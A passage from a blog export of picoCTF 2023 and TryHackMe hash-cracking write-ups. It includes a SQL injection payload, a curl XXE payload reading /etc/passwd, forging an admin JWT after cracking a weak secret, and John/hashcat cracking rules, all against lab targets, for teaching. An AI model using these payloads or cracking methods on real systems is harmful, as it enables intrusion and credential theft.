MIICpzCCAY8CAQAwPDEmMCQGA1UEAwwdcGljb0NURntyZWFkX215Y2VydF9hNzE2 M2JlOH0xEjAQBgNVBCkMCWN0ZlBsYXllcjCCASIwDQYJKoZIhvcNAQEBBQADggEP ADCCAQoCggEBAL6KBBqiFmUHDwT3NtVw+Ozveo9uAZ+c47X5n+MEsWPowsNIz9fG kpLf9rgu9kR4ZR1H5IEddOGEsTA9qRUc1mwBuZeld5o9ltDU+6YzCKANDnwS61sB w4FV54LTy33T1+1bc11o++3LM34pFCGWI3lwoj8GWDRJdxvvp5Iwh5kz4ki6Mwp/ HAKyyG9i9KMOXAm/Zw0FkL1UZppHa00cbdCieen7lZgeVpFlIs3uo8tL6fGmpYww Ard6ZFzL1zCwgZukSHsul20gi9Ba4Uz3R4f6zA/PL0S7haAif96yyi/REREKUZGt 76Gt8zv2xVAqhZYYpFqOmv1ycRmZSyF8GWkCAwEAAaAmMCQGCSqGSIb3DQEJDjEX MBUwEwYDVR0lBAwwCgYIKwYBBQUHAwIwDQYJKoZIhvcNAQELBQADggEBAI4mtS0h 2HQseRJfnySGJdsnquMyLSV1EdvAfb2qTosXuQH0vunk5NbnR9yjXKej0I2Uu6DW f9UehV+QsgW1tmZKpjGXj602nESDBVwiyNw84AXaW74+vH1lVKu9YFf08GI40Fee jYYjQLz6DatXL0Qsuyjjo/MF1W1z/N7ErLvox7tj+dIOfEs14LYx61JrwwcAw8Ak 1lo4gwusg/+aEpAhDcw62Bjh2iGfwydHV7vh04vWBzPoSz5xyrNG+w8kALKKRUTh Z9wKzilfeMGpobC7at6ys5cMdrC3ePVxn0XWTQEWfjQwtr+UtOoOWlP8eJEstWQU qbdZveR4nsgbnkU= -----END CERTIFICATE REQUEST----- Looks base64 encoded, running through CyberChef the flag is found in amongst the decoded output :\nFlag: picoCTF{read_mycert_a7163be8}\nRotation - 100 pts Description You will find the flag after decrypting this file Download the encrypted flag here\nHint💡\nSometimes rotation is right\nGiven the name of this challenge, a rotation-based substitution cipher is suspected.\nApproach The contents of the encrypted flag file are:\nxqkwKBN{z0bib1wv_l3kzgxb3l_25l7k61j} The encrypted text follows the flag structure picoCTF{}\nWe can use CyberChef to find the plaintext. By applying ROT13 operation, and adjesting the amount to 18 we get the Flag\nFlag: picoCTF{r0tat1on_d3crypt3d_25d7c61b}\n","permalink":"https://iasad.me/write-ups/picoctf/2023/cryptography/","summary":"writeups for cryptography cahllanges of picoctf 2023","title":"Cryptography - PicoCTF 2023"},{"content":" Who is it - 100 pts Description Someone just sent you an email claiming to be Google\u0026rsquo;s co-founder Larry Page but you suspect a scam.Can you help us identify whose mail server the email actually originated from?Download the email file here. Flag: picoCTF{FirstnameLastname}\nApproach we need to find the IP address of the sender. In order to determine the sender\u0026rsquo;s IP address, we should search for it within the provided .eml file.\nwe can perform a WHOIS\rlookup using the IP address 173.249.33.206 to retrieve the owner\u0026rsquo;s name.\nFlag: picoCTF{WilhelmZwalina}\nFind and Open - 200 pts Description Someone might have hidden the password in the trace file.Find the key to unlock this file. This tracefile might be good to analyze.\nApproach We have two files: a password-protected ZIP file and a PCAP file. Upon inspecting the PCAP file in Wireshark, a base64 string was discovered.\nDecoded the base64 string and found half flag\n┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ echo VGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8= | base64 -d This is the secret: picoCTF{R34DING_LOKd_ I tried the half flag as a password on the zip and it worked got the flag.\nFlag: picoCTF{R34DING_LOKd_fil56_succ3ss_cbf2ebf6}\nMSB - 200 pts Description This image passes LSB statistical analysis, but we can\u0026rsquo;t help but think there must be something to the visual artifacts present in this image\u0026hellip;Download the image here\rApproach Based on the name and description, it appears that the flag may be hidden in the most significant bit (MSB). I searched for ways to extract the data from MSB, and found a Python tool Sigbit.py\r┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ python sigBits.py -t=msb Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png Done, check the output file! I search for “picoCTF” in the output and found the flag\nFlag: picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_06326238}\n","permalink":"https://iasad.me/write-ups/picoctf/2023/forensics/","summary":"writeups for forensics cahllanges of picoctf 2023","title":"Forensics - PicoCTF 2023"},{"content":" findme - 100 pts Description Help us test the form by submitting the username as test and password as test!\nApproach After logging in to the page using the provided credentials, we were instantly redirected to two pages that appeared to be named in Base64 encoding. I used BurpSuite to intercept and forward both requests individually, which allowed me to capture the flag.\nFlag: picoCTF{proxies_all_the_way_df44c94c}\nMatchTheRegex - 100 pts Description How about trying to match a regular expression\nApproach For this one we have to write a regular expression that matches the flag pattern: picoCTF.*\nFlag: picoCTF{succ3ssfully_matchtheregex_08c310c6}\nMore SQLi - 200 pts Description Can you find the flag on this website.\nApproach we can see the SQL query being made in response\nThis simple SQLi Payload works: ‘ OR 1=1 --\nFlag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}\nSOAP - 100 pts Description The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?\nApproach Upon inspecting the page\u0026rsquo;s source code, we discovered that there is an endpoint named \u0026ldquo;/data\u0026rdquo; that uses XML, as indicated by the corresponding JavaScript file. This suggests that the application may be vulnerable to XML External Entity (XXE) attacks.\nI sent this payload using curl and got the flag\n┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ curl -X POST -H \u0026#34;Content-Type: application/xml\u0026#34; -d \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE data [ \u0026lt;!ENTITY test SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;data\u0026gt;\u0026lt;ID\u0026gt;\u0026amp;test;\u0026lt;/ID\u0026gt;\u0026lt;/data\u0026gt;\u0026#39; http://saturn.picoctf.net:53312/data Invalid ID: root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/usr/sbin/nologin flask❌999:999::/app:/bin/sh picoctf❌1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf} Flag: picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}\nJava Code Analysis!?! Description BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the \u0026lsquo;Flag\u0026rsquo; book!Here are the credentials to get you started:\nUsername: \u0026ldquo;user\u0026rdquo; Password: \u0026ldquo;user\u0026rdquo; Source code can be downloaded here\nApproach Upon logging in with the provided credentials, users are assigned the free user role. The website offers three types of user roles: free, premium, and admin. Only users with the admin role have access to the flag book.\nBased on the given hints, it appears that the website is using JWT for user authentication. With this information, we can check whether it is possible to modify our user role to become an admin.\nTo get the authentication token, we can inspect the cookies using the Chrome Developer Tools.\njwt.io\rcan be used to decode the token and potentially modify its contents.\nIn order to modify the JWT, we would need to have the secret key used to sign it. If the secret key is not sufficiently complex, it may be possible to crack it using a tool like John the Ripper. In this particular case, John the Ripper was able to crack the key in under a second because the key was a simple one - \u0026lsquo;1234\u0026rsquo;.\n┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ echo \u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoi RnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MjU0NjM2OCwiaWF 0IjoxNjgxOTQxNTY4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.au2F6 GtDI5Zoq9ihgltHoYBKbrvutqViF2A0QalxNTw\u0026#34; \u0026gt; jwt.txt ┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ john jwt.txt Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst 1234 (?) 1g 0:00:00:00 DONE 2/3 (2023-04-19 18:01) 50.00g/s Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Now that we have obtained the secret key, we can modify the token to change our user role to admin. Once we have made the necessary changes, we can load the modified token into the local storage using the inspect tool.\nAfter loading the modified token into the local storage, we can simply refresh the page to get the flag.\n","permalink":"https://iasad.me/write-ups/picoctf/2023/web-exploitation/","summary":"writeups for web cahllanges of picoctf 2023","title":"Web Exploitation - PicoCTF 2023"},{"content":"\rInfo\rName: Crack the Hash Level 2\rOS: -\rDifficulty: Medium\rPoints: 600\rLink: TryHackMe\rDescription: Advanced hash cracking challenges and wordlist generation\rIf you want to skip directly to the hash cracking section, click here 🔗\nHash identification When you come across a hash, the first step is usually to figure out what type of hash it is. There are many types of hashes, with some well-known ones like MD5 and SHA1,\nTo identify hashes, the challenge recommended installing Haiti, but I needed to install the gem package first. I did this by running the command\nsudo apt-get install rubygems Once I had done this, I was able to install Haiti by running the command\nsudo gem install haiti-hash Task 1 - Identify Hash Type 741ebf5166b9ece4cca88a3868c44871e8370707cf19af3ceaa4a6fba006f224ae03f39153492853 Launch Haiti on hash\nTask 2 - What is Keccak-256 Hashcat and John the Ripper code? The blue section indicates the mode for Hashcat, while the pink section represents the hash code for John.\nWordlists To crack passwords, you\u0026rsquo;ll need wordlists, which are collections of commonly used passwords or other strings. Two popular sources for wordlists are SecLists and Rawsec\u0026rsquo;s CyberSecurity Inventory.\nSecLists is a comprehensive collection of various types of wordlists used in security assessments, such as passwords, usernames, and URLs. wordlistctl is a script that can fetch, install, update, and search more than 6300 wordlist archives from websites that offer them. Rawsec\u0026rsquo;s CyberSecurity Inventory is a resource inventory for cybersecurity tools, including wordlist generator tools, which can help in the creation of custom wordlists. To use wordlistctl on Kali Linux, clone from Github\rpython3 wordlistctl/wordlistctl.py -h\nsearch for rockyou on your local archive with wordlistctl search -l rockyou\nQ: what is the path where is stored the wordlist?\n/usr/share/wordlists/passwords/rockyou.txt Q: What is the name of the first wordlist in the usernames category?\nCommonAdminBase64 Cracking tools, modes \u0026amp; rules To crack passwords, you\u0026rsquo;ll need a tool like • Hashcat or John the Ripper. There are three ways to crack passwords:\nWordlist mode: This method uses a list of common passwords, usernames, or other words to try and guess the password. Incremental mode: This method tries every possible combination of characters until it finds the password. This can take a long time, especially for long passwords. Rule mode: This method uses a wordlist but adds some patterns or modifies the words to try and guess the password. There are two ways to perform a rule-based brute force:\nGenerate a custom wordlist and use it with the classic wordlist mode. Use a common wordlist and apply custom mangling rules to it. This is more efficient as you don\u0026rsquo;t have to store and generate multiple wordlists. John the Ripper has various built-in rules to apply to wordlists, but you can also create your own. You can check the John the Ripper Wordlist rules syntax for guidance on creating custom rules.\nJohn the Ripper already include various mangling rules but you can create your owns and apply them the wordlist when cracking:\n$ john hash.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt rules=norajCommon02 ﻿You can consult John the Ripper Wordlist rules syntax for creating your own rules.\nI\u0026rsquo;ll give you the main ideas of mutation rules, of course several can be combined together.\nBorder mutation - commonly used combinations of digits and special symbols can be added at the end or at the beginning, or both Freak mutation - letters are replaced with similarly looking special symbols Case mutation - the program checks all variations of uppercase/lowercase letters for any character Order mutation - character order is reversed Repetition mutation - the same group of characters are repeated several times Vowels mutation - vowels are omitted or capitalized Strip mutation - one or several characters are removed Swap mutation - some characters are swapped and change places Duplicate mutation - some characters are duplicated Delimiter mutation - delimiters are added between characters Depending of your distribution, the John configuration may be located at /etc/john/john.conf and/or /usr/share/john/john.confTo locate the JtR install directory run locate john.confthen create john-local.confin the same directory (in my case/usr/share/john/john-local.conf and create our rules in here.\nLet’s use the top 10 000 most used password list from SecLists (/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt) and generate a simple border mutation by appending all 2 digits combinations at the end of each password.Let\u0026rsquo;s edit /usr/share/john/john-local.conf and add a new rule:,\nlet\u0026rsquo;s crack the SHA1 hash 2d5c517a4f7a14dcb38329d228a7d18a3b78ce83 Now let’s crack the SHA1 hash we just have to write the hash in a text file and to specify the hash type, the wordlist and our rule name.\njohn hash.txt --format=raw-sha1 --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --rules=THM01 Custom wordlist generation Generating a custom wordlist may be a better option in some cases, even though using mangling rules can save storage space and time. Some reasons to generate a custom wordlist include:\nYou plan to use the wordlist multiple times, and generating one upfront will save computation power compared to using a mangling rule each time. You want to use the same wordlist across different cracking tools. The tool you want to use supports wordlists but not mangling rules. You find the syntax for creating custom rules in John too complex. Mentalist Let\u0026rsquo;s say we know the password we want to crack is about dogs. We can download a list of dog races wordlistctl fetch -l dogs -d (/usr/share/wordlists/misc/dogs.txt). Then we can use Mentalist to generate some mutations.\nQuestion 1 Crack the following md5 hash with the wordlist generated in the previous steps.\ned91365105bba79fdab20c376d83d752 CeWL Now let’s use CeWL to generate a wordlist from a website. It could be useful to retrieve a lot of words related to the password’s topic.\nFor example to download all words from example.org with a depth of 2, run:cewl -d 2 -w $(pwd)/example.txt https://example.orgThe depth is the number of link level the spider will follow.\nQuestion 2 What is the last word of the list?\nTTPassGen pip install ttpassgen With TTPassGen we can craft wordlists from scratch. Create a first wordlist containing all 4 digits PIN code value.\nttpassgen --rule \u0026#39;[?d]{4:4:*}\u0026#39; pin.txt Generate a list of all lowercase chars combinations of length 1 to 3.\nttpassgen --rule \u0026#39;[?l]{1:3:*}\u0026#39; abc.txt Then we can create a new wordlist that is a combination of several wordlists. Eg. combine the PIN wordlist and the letter wordlist separated by a dash.\nttpassgen --dictlist \u0026#39;pin.txt,abc.txt\u0026#39; --rule \u0026#39;$0[-]{1}$1\u0026#39; combination.txt Be warned combining wordlists quickly generated huge files, here combination.txt is 1.64 GB.\n$ wc pin.txt\r10000 10000 50000 pin.txt\r$ wc abc.txt\r18278 18278 72384 abc.txt\r$ wc combination.txt\r182780000 182780000 1637740000 combination.txt Question 3 Crack this md5 hash with combination.txt.\ne5b47b7e8df2597077e703c76ee86aee\nIt\u0026rsquo;s time to crack hashes - the actual challange You will have to crack several hashes. For each hash you will be given a short scenario that will help you to create a mangling rules, build a wordlist or finding some specialized data you\u0026rsquo;ll need to crack the hash.\nTask 1 Advice n°1 = b16f211a8ad7f97778e5006c7cecdf31 Question Hint💡\nEnglish male name, MD5, Border mutation, custom rule\necho \u0026#39;b16f211a8ad7f97778e5006c7cecdf31\u0026#39; \u0026gt; hash1.txt As the hint suggests the password is english male name with border mutation and custom rule and we also know that it is md5 hash.\nFirst, we need to find wordlist of male names using wordlistctl python3 [wordlistctl.py](http://wordlistctl.py/) search male\ndownload any wordlist I will use top_1000_usa_femalenames_english with the following commad\npython3 wordlistctl.py fetch -l top_1000_usa_femalenames_english -d Secondly, create a custom rule in john-local.config\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ cat /usr/share/john/john-local.conf [List.Rules:task01] c$[0-9!@#$%^\u0026amp;*()_+]$[0-9!@#$%^\u0026amp;*()_+]$[0-9!@#$%^\u0026amp;*()_+]$[0-9!@#$%^\u0026amp;*()_+]$[0-9!@#$%^\u0026amp;*()_+] c^[0-9!@#$%^\u0026amp;*()_+]^[0-9!@#$%^\u0026amp;*()_+]^[0-9!@#$%^\u0026amp;*()_+]^[0-9!@#$%^\u0026amp;*()_+]^[0-9!@#$%^\u0026amp;*()_+] The border mutation rule adds a combination of digits and special symbols at the end or beginning, or both, and is commonly used.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-MD5 hash1.txt --wordlist=malenames-usa-top1000.txt --rules=task01 Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:06 0.41% (ETA: 19:20:20) 0g/s 7024Kp/s 7024Kc/s 7024KC/s Lane03+4+..Curtis03+50 Za**********4* (?) 1g 0:00:00:33 DONE (2021-04-23 18:56) 0.03018g/s 7760Kp/s 7760Kc/s 7760KC/s Alden1234*..Ivan1234( Use the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably Session completed Task 2 Advice n°2 = 7463fcb720de92803d179e7f83070f97 Question Hint💡\nEnglish female name, MD5, Border mutation, custom rule\necho \u0026#39;7463fcb720de92803d179e7f83070f97\u0026#39; \u0026gt; hash2.txt First, download common female namelist using wordlistctl\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ wordlistctl fetch -l femalenames-usa-top1000 Then create a rule in john-local.config according to the advice no 2 which suggests to use border mutation:\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ cat /usr/share/john/john-local.conf [List.Rules:task02] c$[0-9!@#$%^\u0026amp;*()_+]$[0-9!@#$%^\u0026amp;*()_+]$[0-9!@#$%^\u0026amp;*()_+] c^[0-9!@#$%^\u0026amp;*()_+]^[0-9!@#$%^\u0026amp;*()_+]^[0-9!@#$%^\u0026amp;*()_+] Now run john on it\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-MD5 hash2.txt --wordlist=femalenames-usa-top1000.txt --rules=task02 ┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-MD5 hash2.txt --show ?:*********5! Task 3 Advice n°2 = 7463fcb720de92803d179e7f83070f97 Question Hint💡\nTown name of Mexico, MD5, Freak mutation, mentalist tool\necho \u0026#39;7463fcb720de92803d179e7f83070f97\u0026#39; \u0026gt; hash3.txt First, download Mexico town namelist using wordlistctl\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ wordlistctl fetch -l towns_mx -d Clean the wordlist. Remove spaces and change everything to lowercase.\ncat cities.txt | sed -r \u0026#39;s/\\s+//g\u0026#39; | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \u0026gt; cities_final.txt the advice suggests to use freak mutation. There is a default rule in john, “l33t”, which does the freak mutation by default.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-MD5 hash3.txt --wordlist=cities_final.txt --rules=l33t ┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-MD5 hash2.txt --show Tl@x******ng0 Task 4 Advice n°4 a3a321e1c246c773177363200a6c0466a5030afc Question Hint💡\nOwn name, SHA1, Case mutation; existing rule\necho \u0026#39;a3a321e1c246c773177363200a6c0466a5030afc\u0026#39; \u0026gt; hash4.txt First, we need to find the wordlist Since, wordlist consists of his name. We can add his first name, last name, combined name into the wordlist.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ cat names.txt david gauttapan davidguattapan The \u0026ldquo;TN\u0026rdquo; rule in john is a default rule that toggles the case of each character in a password candidate.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-SHA1 hash4.txt --wordlist=names.txt --rules=NT Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Dav******An (?) 1g 0:00:00:00 DONE (2021-04-23 20:27) 8.333g/s 38333p/s 38333c/s 38333C/s DavIDgUEttapAn..DavIDgUEtTAPAn Use the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords reliably Session completed Task 5 Advice n°5 d5e085772469d544a447bc8250890949 Question Hint💡\nLyrics, MD5, Order mutation, lyricpass\necho \u0026#39;d5e085772469d544a447bc8250890949\u0026#39; \u0026gt; hash5.txt First, we need to find the wordlist We can use lyricpass to download the lyrics of all the songs by Adele. Using the command:\nlyricpass.py -a \u0026quot;Adele\u0026quot;\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ lyricpass.py -a Adele [+] Looking up artist Adele [+] Found 345 songs for artists Adele [+] All done! 345/345... Raw lyrics: raw-lyrics-2021-04-23-20.30.50 Passphrases: wordlist-2021-04-23-20.30.50 The advice suggests \u0026ldquo;Order mutation - character order is reversed is used for that we have a default rule in john “r” we can use that\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-MD5 hash5.txt --wordlist=raw-lyrics-2021-04-23-20.30.50 --rules=r Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status uoy ot m**s ot em rof ***d oot ro **** oot si ***ir oN (?) 1g 0:00:00:00 DONE (2021-04-23 20:40) 16.66g/s 6400p/s 6400c/s 6400C/s tnew yrots eht woh si sihT..egdirb eht rednu retaw tnia evol ruo taht yaS Use the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably Session completed Task 6 Advice n°6 377081d69d23759c5946a95d1b757adc Question Hint💡\nPhone number, MD5, No mutation, pnwgen\necho \u0026#39;a3a321e1c246c773177363200a6c0466a5030afc\u0026#39; \u0026gt; hash6.txt Clues from the given advice: ******Phone number from Sint Maarten. No Mutation.\nFirst, we need to find the wordlist. for this we have to know what prefix Sint Maarten uses. here is a full list of country codes and prefixes on wikipedia\nSint Maarten: +1 and 721 prefix for mobile phone number\n┌──(kali㉿iasad)-[~/CTFs/tryhackme]\r└─$ python pnwgen.py +1721 \u0026#39;\u0026#39; 7 this will create a wordlist of all possible numbers in the given prefix and length is 7\n┌──(kali㉿iasad)-[~/CTFs/tryhackme]\r└─$ $ john hash6.txt --format=raw-md5 --wordlist=/tmp/pnwgen/wordlist.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\r+1721****375 (?)\r1g 0:00:00:00 DONE (2021-04-23 20:27) 8.333g/s 38333p/s 38333c/s 38333C/s DavIDgUEttapAn..DavIDgUEtTAPAn\rUse the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords reliably\rSession completed Task 7 Advice n°7 ba6e8f9cd4140ac8b8d2bf96c9acd2fb58c0827d556b78e331d1113fcbfe425ca9299fe917f6015978f7e1644382d1ea45fd581aed6298acde2fa01e7d83cdbd Question Hint💡\nRockyou, SHA3-512, No mutation\necho \u0026#39;ba6e8f9cd4140ac8b8d2bf96c9acd2fb58c0827d556b78e331d1113fcbfe425ca9299fe917f6015978f7e1644382d1ea45fd581aed6298acde2fa01e7d83cdbd\u0026#39; \u0026gt; hash7.txt Clues from the given advice: “ Last Competition Project of NIST” .Searching from the internet, I got to know that the hash is Raw-SHA3.\nSo we have to use sha3 hash\n┌──(kali㉿iasad)-[~/CTFs/tryhackme]\r└─$ $ john hash.txt --format=raw-sha3 --wordlist=rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\r!@#******!@# (?)\r1g 0:00:00:00 DONE (2021-04-23 20:27) 8.333g/s 38333p/s 38333c/s 38333C/s DavIDgUEttapAn.\rUse the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords\rSession completed Task 8 Advice n°8 9f7376709d3fe09b389a27876834a13c6f275ed9a806d4c8df78f0ce1aad8fb343316133e810096e0999eaf1d2bca37c336e1b7726b213e001333d636e896617 Question Hint💡\nWeb scrapping, blake2, Repetition, CeWL\necho \u0026#39;ba6e8f9cd4140ac8b8d2bf96c9acd2fb58c0827d556b78e331d1113fcbfe425ca9299fe917f6015978f7e1644382d1ea45fd581aed6298acde2fa01e7d83cdbd\u0026#39; \u0026gt; hash8.txt Clues from the given advice: All the words are form the webpage . Repetition of same word 2 or 3 or 5 or more than 5 times. Finalist of SHA-3 project. A simple internet search gives us the hash type.\nUse CeWL to scrape the words from the website.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ cewl -d 2 -w hash8_scrapped.txt http://\u0026lt;MACHINE_IP\u0026gt;/rtfm.re/en/sponsors/index.html Generate the wordlist with 1,2,3,4 and 5 repetition of the words using python script.\nfile1 = open(\u0026#39;hash8_scrapped.txt\u0026#39;, \u0026#39;r\u0026#39;) file2 = open(\u0026#39;hash8_final.txt\u0026#39;, \u0026#39;w\u0026#39;) while True: l = file1.readline() if not l: break l = l.strip() for i in range(1, 6): file2.write(l*i+\u0026#39;\\n\u0026#39;) file1.close() file2.close() Use john with Raw-Blake2\n┌──(kali㉿iasad)-[~/CTFs/tryhackme] └─$ john --format=Raw-Blake2 hash8 -wordlist=hash8_final.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hacki************nghacking (?) 1g 0:00:00:00 DONE (2021-04-23 20:27) 8.333g/s 38333p/s 38333c/s 38333C/s DavIDgUEttapAn..DavIDgUEtTAPAn Use the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords reliably Session completed Task 9 Advice n°9 $6$kI6VJ0a31.SNRsLR$Wk30X8w8iEC2FpasTo0Z5U7wke0TpfbDtSwayrNebqKjYWC4gjKoNEJxO/DkP.YFTLVFirQ5PEh4glQIHuKfA/ Question Hint💡\nRockyou, SHA512-crypt, No mutation\necho \u0026#39;$6$kI6VJ0a31.SNRsLR$Wk30X8w8iEC2FpasTo0Z5U7wke0TpfbDtSwayrNebqKjYWC4gjKoNEJxO/DkP.YFTLVFirQ5PEh4glQIHuKfA/\u0026#39; \u0026gt; hash9.txt using sha512crypt format\n┌──(kali㉿iasad)-[~/CTFs/tryhackme]\r└─$ $ john --format=sha512crypt hash9.txt --wordlist=/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\rCost 1 (iteration count) is 5000 for all loaded hashes\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rkakashi1 (?)\r1g 0:00:00:17 DONE (2021-04-23 16:34) 0.05701g/s 1590p/s 1590c/s 1590C/s mothers..citlali\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed Conclusion In summary, this room has a lot of valuable content and teachings about the rules in John. It may take some time to fully understand everything, but it is worth it. If you have any questions, don\u0026rsquo;t hesitate to ask me.\n","permalink":"https://iasad.me/write-ups/tryhackme/crack-the-hash-level-2/","summary":"Advanced hash cracking challenges and wordlist generation","title":"Crack the Hash Level 2 - TryHackMe"},{"content":"\rInfo\rName: Crack the Hash\rOS: -\rDifficulty: Easy\rPoints: 320\rLink: TryHackMe\rDescription: analyzing and cracking hashes using hashcat and crackstation\rIntroduction We will be tackling a hacking challenge today on tryhackme, where the community have created multiple challenges. you can participate in these challenges freely.\nSpecifically, I will be providing a walkthrough on the crack the hash challenge. This challenge comprises nine tasks, which I will explain in detail, one by one.\nTools used for hash analyzing and cracking hashes hash-identifier hash-analyzer hash-identification hashcat crackstation hashes Task 1 - md5 hash: 48bb6e862e54f2a795ffc4e541caed4d\nFirst we need to identify the hash type using tools like hash-identifier or online hash analyzer sites like hash-analyzer\nso it is an MD5 hash now to crack it we can use tools like hashcat or online platform like crackstation\nAnswer: easy\nTask 2 - sha1 hash: CBFDAC6008F9CAB4083784CBD1874F76618D2A97\nsimilarly we can find this one also on crackstation. this time it is a sha1 hash\nAnswer: password123\nTask 3 - sha256 hash: 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\nagain we will use crackstation. this time it is a sha256 hash\nAnswer: letmein\nTask 4 - bcrypt hash: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\nAnalyzing hash type using hash-analyzer we can see it is a bcrypt hash\nThis hash is difficult to crack using online tools, which is why we can use tools such as hashcat\nHashcat Hashcat is a password cracking tool that uses brute-force, dictionary, and rule-based attacks to recover passwords from various types of hashed data.\nto install hashcat → sudo apt install hashcat. to crack hashes using hashcat we provide it the hashhashed.txt a wordlist i.e. rockyou.txt and -m switch for mode (mode specify hash type)for bcrypt mode is -m 3200\nAsad@Kali:~/tools/hashcat$ ./hashcat64.bin -m 3200 hash.txt ../rockyou.txt Answer: bleh\nTask 5 - md4 Hash: 279412f945939ba78ce0758d3fd83daa\nagain the same process identify the hash using hash-analyzer and crack it using hashcat\n./hashcat64.bin -m 900 hash.txt rockyou.txt\nthis one was also present on crackstation\nAnswer: Ethernity22\nTask 6 - sha256 hash: F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85\nsame drill - identify hash type → hash-analyzer\nHashcat asad@kali:~/tools/hashcat$ 